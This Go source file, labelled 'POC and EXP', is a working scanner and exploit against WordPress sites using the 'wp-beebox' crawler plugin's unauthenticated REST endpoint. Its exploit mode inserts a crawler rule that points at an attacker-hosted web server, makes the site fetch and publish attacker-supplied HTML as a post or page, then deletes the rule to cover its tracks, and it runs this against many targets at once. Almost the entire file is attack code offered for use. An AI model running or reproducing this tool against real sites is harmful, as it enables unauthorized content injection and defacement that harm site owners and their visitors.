//POC and EXP, By FJD Deng-Xian-Sheng 
package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/gin-gonic/gin"
	"github.com/tidwall/gjson"
	"github.com/urfave/cli"
	"html/template"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

var (
	channelListenInput = make(chan string, 20)
	channelET          = make(chan string, 1024)
	runLogFile         = runLog("POC")
	POCLog             = log.New(io.MultiWriter(runLogFile, os.Stdin), "[POC]", log.Llongfile|log.LstdFlags)
	runEXPLogFile      = runLog("EXP")
	EXPLog             = log.New(io.MultiWriter(runEXPLogFile, os.Stdin), "[EXP]", log.Llongfile|log.LstdFlags)
	wgEnd              sync.WaitGroup
)

type AutoGenerated struct {
	Success bool `json:"success"`
	Data    Data `json:"data"`
}
type Single struct {
	Encode     string `json:"encode"`
	InnerImage string `json:"inner_image"`
	Title      string `json:"title"`
	Content    string `json:"content"`
	Name       string `json:"name"`
	URL        string `json:"url"`
}
type Data struct {
	Single []Single      `json:"single"`
	List   []interface{} `json:"list"`
}
type AutoGeneratedTwo struct {
	Action  string    `json:"action"`
	DataTwo []DataTwo `json:"data"`
	Target  string    `json:"target"`
}
type DataTwo struct {
	Name       string `json:"name"`
	URL        string `json:"url"`
	Title      string `json:"title"`
	Content    string `json:"content"`
	InnerImage string `json:"inner_image"`
	Encode     string `json:"encode"`
}

func jsonPost(URL string, json []byte) []byte {
	req, err := http.NewRequest("POST", URL, bytes.NewBuffer(json))
	if err != nil {
		log.Panic(err)
	}
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Panic(err)
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Panic(err)
	}
	return body
}
func Exit() {
	defer runLogFile.Close()
	defer runEXPLogFile.Close()
	os.Exit(0)
}
func URLFormat(URL string) string {
	if string(URL[len(URL)-1]) == "/" {
		URL = URL[:len(URL)-1]
	}
	if len(URL) >= 4 {
		if URL[0:4] == "http" {
			return URL
		} else {
			// 声明字节缓冲
			var stringBuilder bytes.Buffer
			// 把字符串写入缓冲
			stringBuilder.WriteString("http://")
			stringBuilder.WriteString(URL)
			// 将缓冲以字符串形式返回
			return stringBuilder.String()
		}
	} else {
		// 声明字节缓冲
		var stringBuilder bytes.Buffer
		// 把字符串写入缓冲
		stringBuilder.WriteString("http://")
		stringBuilder.WriteString(URL)
		// 将缓冲以字符串形式返回
		return stringBuilder.String()
	}
}
func URLNotFormat(URL string) string {
	if string(URL[len(URL)-1]) == "/" {
		URL = URL[:len(URL)-1]
	}
	if len(URL) >= 4 {
		if URL[0:4] == "http" && URL[0:5] != "https" {
			return URL[7:]
		} else if URL[0:5] == "https" {
			return URL[8:]
		} else {
			return URL
		}
	} else {
		return URL
	}
}
func runLog(Type string) *os.File {
	logFile, err := os.OpenFile(Type+".log", os.O_APPEND|os.O_WRONLY|os.O_CREATE, os.ModeAppend|os.ModePerm)
	if err != nil {
		log.Panic(Type+" log write error", err)
	}
	return logFile
}
func POC(Type string) {
	for ET := range channelET {
		go func(ET string) {
			defer func() {
				if err := recover(); err != nil {
					POCLog.Println(err)
				}
			}()
			if Type == "ETNotnull" {
				defer wgEnd.Done()
			}
			ET = ET + "/wp-json/wp-beebox/v1/crawler"
			body := jsonPost(ET, []byte(`{"action":"get_rule"}`))
			result := gjson.Get(string(body), "success")
			if result.Bool() == true {
				POCLog.Println(ET + "|Yes")
			} else {
				POCLog.Println(ET + "|No")
			}
		}(ET)
	}
}
func EXP(IP, Port, PageType, Type string) {
	if PageType == "Article" {
		PageType = "post"
	} else {
		PageType = "page"
	}
	for ET := range channelET {
		go func(ET string) {
			defer func() {
				if err := recover(); err != nil {
					EXPLog.Println(err)
				}
			}()
			if Type == "ETNotnull" {
				defer wgEnd.Done()
			}
			ET = ET + "/wp-json/wp-beebox/v1/crawler"
			body := jsonPost(ET, []byte(`{"action":"get_rule"}`))
			result := gjson.Get(string(body), "success")
			if result.Bool() == true {
				var jsonForStruct AutoGenerated
				var deleteRule AutoGenerated
				json.Unmarshal(body, &jsonForStruct)
				json.Unmarshal(body, &deleteRule)
				var skipAddrule bool
				for _, v := range jsonForStruct.Data.Single {
					if v.Name == "Default" && v.URL == URLNotFormat(IP)+":"+Port {
						skipAddrule = true
					}
				}
				if skipAddrule == false {
					jsonForStruct.Data.Single = append(jsonForStruct.Data.Single, Single{
						Encode:     "utf8",
						InnerImage: "2|img|src",
						Title:      "2|h1",
						Content:    "2|main",
						Name:       "Default",
						URL:        URLNotFormat(IP) + ":" + Port,
					})
					var StructForJson AutoGeneratedTwo
					for _, v := range jsonForStruct.Data.Single {
						StructForJson.DataTwo = append(StructForJson.DataTwo, DataTwo{
							Encode:     v.Encode,
							InnerImage: v.InnerImage,
							Title:      v.Title,
							Content:    v.Content,
							Name:       v.Name,
							URL:        v.URL,
						})
					}
					StructForJson = AutoGeneratedTwo{
						Action:  "save_single_rule",
						DataTwo: StructForJson.DataTwo,
						Target:  "single",
					}
					result, err := json.Marshal(StructForJson)
					if err != nil {
						EXPLog.Panic(err)
					}
					body := jsonPost(ET, result)
					jsonPostResult := gjson.Get(string(body), "success")
					if jsonPostResult.Bool() == true {
						body := jsonPost(ET, []byte(`{"target_urls":"`+URLFormat(IP)+":"+Port+`","crawler_type":"single","keep_duplicate":"yes","author":"1","post_status":"publish","post_tags":[],"post_cates":[],"post_type":"`+PageType+`","removeImages":"keep","remove_html_tags":"keep","keep_links":"yes","keep_style":"yes","target_url":"`+URLNotFormat(IP)+":"+Port+`","action":"get_target_content"}`))
						result := gjson.Get(string(body), "success")
						if result.Bool() == true {
							var StructForJson AutoGeneratedTwo
							if len(deleteRule.Data.Single) == 0 {
								StructForJson.DataTwo = []DataTwo{}
							} else {
								for _, v := range deleteRule.Data.Single {
									StructForJson.DataTwo = append(StructForJson.DataTwo, DataTwo{
										Encode:     v.Encode,
										InnerImage: v.InnerImage,
										Title:      v.Title,
										Content:    v.Content,
										Name:       v.Name,
										URL:        v.URL,
									})
								}
							}
							StructForJson = AutoGeneratedTwo{
								Action:  "save_single_rule",
								DataTwo: StructForJson.DataTwo,
								Target:  "single",
							}
							result, err := json.Marshal(StructForJson)
							if err != nil {
								EXPLog.Panic(err)
							}
							body := jsonPost(ET, result)
							jsonPostResult := gjson.Get(string(body), "success")
							if jsonPostResult.Bool() == true {
								EXPLog.Println(ET + "|Yes")
							}
						}
					} else {
						EXPLog.Println(ET + "|No,Number two step fail(Add rule)")
					}
				} else {
					body := jsonPost(ET, []byte(`{"target_urls":"`+URLFormat(IP)+":"+Port+`","crawler_type":"single","keep_duplicate":"yes","author":"1","post_status":"publish","post_tags":[],"post_cates":[],"post_type":"`+PageType+`","removeImages":"keep","remove_html_tags":"keep","keep_links":"yes","keep_style":"yes","target_url":"`+URLNotFormat(IP)+":"+Port+`","action":"get_target_content"}`))
					result := gjson.Get(string(body), "success")
					if result.Bool() == true {
						var StructForJson AutoGeneratedTwo
						if len(jsonForStruct.Data.Single) == 1 {
							StructForJson.DataTwo = []DataTwo{}
						} else {
							for _, v := range jsonForStruct.Data.Single {
								if v.Name != "Default" && v.URL != URLNotFormat(IP)+":"+Port {
									StructForJson.DataTwo = append(StructForJson.DataTwo, DataTwo{
										Encode:     v.Encode,
										InnerImage: v.InnerImage,
										Title:      v.Title,
										Content:    v.Content,
										Name:       v.Name,
										URL:        v.URL,
									})
								}
							}
						}
						StructForJson = AutoGeneratedTwo{
							Action:  "save_single_rule",
							DataTwo: StructForJson.DataTwo,
							Target:  "single",
						}
						result, err := json.Marshal(StructForJson)
						if err != nil {
							EXPLog.Panic(err)
						}
						body := jsonPost(ET, result)
						jsonPostResult := gjson.Get(string(body), "success")
						if jsonPostResult.Bool() == true {
							EXPLog.Println(ET + "|Yes")
						}
					}
				}
			} else {
				EXPLog.Println(ET + "|No")
			}
		}(ET)
	}
}
func LoadTemplate() (*template.Template, error) {
	template := template.New("")
	for name, file := range Assets.Files {
		if file.IsDir() || !strings.HasSuffix(name, ".tmpl") {
			continue
		}
		result, err := ioutil.ReadAll(file)
		if err != nil {
			return nil, err
		}
		template, err = template.New(name).Parse(string(result))
		if err != nil {
			return nil, err
		}
	}
	return template, nil
}
func Service(Port, PayloadForTitle, PayloadForMain string) {
	gin.SetMode(gin.ReleaseMode) //启动生产环境
	// 禁用控制台颜色，将日志写入文件时不需要控制台颜色。
	gin.DisableConsoleColor()
	// 记录日志到文件。
	logFile, err := os.OpenFile("ginHttpService.log", os.O_APPEND|os.O_WRONLY|os.O_CREATE, os.ModeAppend|os.ModePerm)
	if err != nil {
		log.Panic("ginHttpService log write error", err)
	}
	//及时关闭file句柄
	defer logFile.Close()
	gin.DefaultWriter = io.MultiWriter(logFile)
	router := gin.Default()
	templateData, err := LoadTemplate()
	if err != nil {
		log.Panic(err)
	}
	router.SetHTMLTemplate(templateData)
	router.GET("/", func(c *gin.Context) {
		c.HTML(http.StatusOK, "/index.tmpl", gin.H{
			"title": template.HTML(""), "contentForH1": template.HTML(PayloadForTitle), "contentForMain": template.HTML(PayloadForMain),
		})
	})
	server := &http.Server{
		Addr:           ":" + Port,
		Handler:        router,
		ReadTimeout:    30 * time.Second,
		WriteTimeout:   30 * time.Second,
		MaxHeaderBytes: 1 << 20,
	}
	go func() {
		defer func() {
			if err := recover(); err != nil {
				log.Println(err)
			}
		}()
		// 服务连接
		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Panic("listen:", err)
		}
	}()
	// 等待中断信号以优雅地关闭服务器（设置 5 秒的超时时间）
	quit := make(chan os.Signal, 2)
	signal.Notify(quit, os.Interrupt)
	<-quit
	log.Println("Shutdown Server ...")

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	if err := server.Shutdown(ctx); err != nil {
		log.Panic("Server Shutdown:", err)
	}
	log.Println("Server exiting")
	Exit()
}
func GetFile(path string) (string, bool) {
	path = filepath.FromSlash(path)
	OsFile, err := os.OpenFile(path, os.O_RDONLY, os.ModeAppend|os.ModePerm)
	if err != nil {
		return "", false
	}
	scanner := bufio.NewScanner(OsFile)
	var FileData string
	// 设置分词方式(按行读取)
	scanner.Split(bufio.ScanLines)
	for scanner.Scan() {
		if FileData == "" {
			FileData = FileData + scanner.Text()
		} else {
			FileData = FileData + "\n" + scanner.Text()
		}
	}
	return FileData, true
}
func ListenInput() {
	app := cli.NewApp()
	osArgs := []string{app.Name}
	Close := false
	var ExploitTarget string
	fmt.Println("Please Input -h look Help")
	app.Flags = []cli.Flag{
		cli.StringFlag{
			Name:        "ET",
			Usage:       "Exploit target, Interactive mode;Multiple targets are separated by ','! ",
			Destination: &ExploitTarget,
		},
	}
	app.Action = func(c *cli.Context) {
		if c.NArg() != 0 {
			return
		}
		for {
			if Close == true {
				break
			}
			if ExploitTarget != "" {
				channelListenInput <- ExploitTarget
			}
			fmt.Print(">")
			scanner := bufio.NewScanner(os.Stdin)
			scanner.Scan()
			input := scanner.Text()

			cmdArgs := make([]string, 0, 10)
		cmdArgsFor:
			for k, v := 0, " "; k < 10; k++ {
				cmdArgs = strings.Split(input, v)
				if len(cmdArgs) >= 3 {
					v += " "
				} else {
					break cmdArgsFor
				}
			}
			cmdArgsTwo := make([]string, 0, 10)
			for k, v := range cmdArgs {
				if k != 0 {
					v = strings.Replace(v, " ", "", -1)
				}
				cmdArgsTwo = append(cmdArgsTwo, v)
			}
			cmdArgs = cmdArgsTwo
			if len(cmdArgs) == 0 {
				continue
			}
			osArgs = []string{app.Name}
			osArgs = append(osArgs, cmdArgs...)
			err := c.App.Run(osArgs)
			if err != nil {
				log.Println(err)
			}
		}
	}
	app.Commands = []cli.Command{
		{
			Name:  "Close",
			Usage: "End operation! ",
			Action: func(c *cli.Context) error {
				Close = true
				return nil
			},
		},
	}
	err := app.Run(osArgs)
	if err != nil {
		log.Panic(err)
	}
	Exit()
}
func Cli() (string, string, string, string, string, string, string, error) {
	app := cli.NewApp()

	var IP string
	var Port string
	var Type string
	var PayloadForTitle string
	var PayloadForMain string
	var PageType string
	var ET string

	app.Flags = []cli.Flag{
		cli.StringFlag{
			Name:        "IP",
			Usage:       "Your IP or URL, public network address! ",
			Destination: &IP,
			Required:    true,
		},
		cli.StringFlag{
			Name:        "Port",
			Usage:       "Your port, ensure unobstructed! ",
			Destination: &Port,
			Required:    true,
		},
		cli.StringFlag{
			Name:        "Type",
			Usage:       "'POC' or 'EXP'? ",
			Value:       "POC",
			Destination: &Type,
		},
		cli.StringFlag{
			Name:        "PayloadForTitle",
			Usage:       "Article Title,You can use file paths,if the 'Type' is 'EXP', this or 'PayloadForMain' item is required! ",
			Destination: &PayloadForTitle,
		},
		cli.StringFlag{
			Name:        "PayloadForMain",
			Usage:       "Article content,You can use file paths, if the 'Type' is 'EXP', this or 'PayloadForTitle' item is required! ",
			Destination: &PayloadForMain,
		},
		cli.StringFlag{
			Name:        "PageType",
			Usage:       "The publishing type is article or page? ",
			Value:       "Article",
			Destination: &PageType,
		},
		cli.StringFlag{
			Name:        "ET",
			Usage:       "Exploit target,Only for automatic operation, please fill in the file path; It only supports reading from files. If you need command-line interaction, please ignore this item! ",
			Destination: &ET,
		},
	}

	app.Action = func(c *cli.Context) error {
		if c.NArg() > 0 {
			return errors.New("Two values are not accepted for the same option, and the options are separated by spaces! ")
		}
		return nil
	}
	err := app.Run(os.Args)
	if err != nil {
		return "", "", "", "", "", "", "", err
	}
	if Type == "EXP" && (PayloadForTitle == "" && PayloadForMain == "") {
		return "", "", "", "", "", "", "", errors.New("If the 'Type' is 'EXP', 'PayloadForTitle' or 'PayloadForMain' item is required! ")
	}
	if IP == "" || Port == "" {
		Exit()
	}
	return IP, Port, Type, PayloadForTitle, PayloadForMain, PageType, ET, nil
}
func main() {
	IP, Port, Type, PayloadForTitle, PayloadForMain, PageType, ET, err := Cli()
	if err != nil {
		fmt.Println("Please Input -h look Help")
		log.Panic(err)
	}
	if Type == "EXP" {
		fileResult, fileBool := GetFile(PayloadForTitle)
		if fileBool == true {
			PayloadForTitle = fileResult
		}
		fileResult, fileBool = GetFile(PayloadForMain)
		if fileBool == true {
			PayloadForMain = fileResult
		}
		go Service(Port, PayloadForTitle, PayloadForMain)
		if ET != "" {
			go EXP(IP, Port, PageType, "ETNotnull")
			fileResult, fileBool := GetFile(ET)
			if fileBool == true {
				ET = fileResult
			} else {
				log.Panic("--ET(Exploit target)Fail to read file! ")
			}
			// fmt.Println(IP, Port, PayloadForTitle, PayloadForMain, ET)
			ETScanner := bufio.NewScanner(strings.NewReader(ET))
			for ETScanner.Scan() {
				ETSplit := strings.Split(ETScanner.Text(), ",")
				for _, v := range ETSplit {
					v = URLFormat(v)
					wgEnd.Add(1)
					channelET <- v
				}
			}
		} else {
			go EXP(IP, Port, PageType, "ETnull")
			// fmt.Println(IP, Port, PayloadForTitle, PayloadForMain)
			go ListenInput()
			for channeResult := range channelListenInput {
				channeResultSplit := strings.Split(channeResult, ",")
				for _, v := range channeResultSplit {
					v = URLFormat(v)
					channelET <- v
				}
			}
		}
	} else {
		if ET != "" {
			go POC("ETNotnull")
			fileResult, fileBool := GetFile(ET)
			if fileBool == true {
				ET = fileResult
			} else {
				log.Panic("--ET(Exploit target)Fail to read file! ")
			}
			// fmt.Println(IP, Port, ET)
			ETScanner := bufio.NewScanner(strings.NewReader(ET))
			for ETScanner.Scan() {
				ETSplit := strings.Split(ETScanner.Text(), ",")
				for _, v := range ETSplit {
					v = URLFormat(v)
					wgEnd.Add(1)
					channelET <- v
				}
			}
			wgEnd.Wait()
			Exit()
		} else {
			go POC("ETnull")
			// fmt.Println(IP, Port)
			go ListenInput()
			for channeResult := range channelListenInput {
				channeResultSplit := strings.Split(channeResult, ",")
				for _, v := range channeResultSplit {
					v = URLFormat(v)
					channelET <- v
				}
			}
		}
	}
}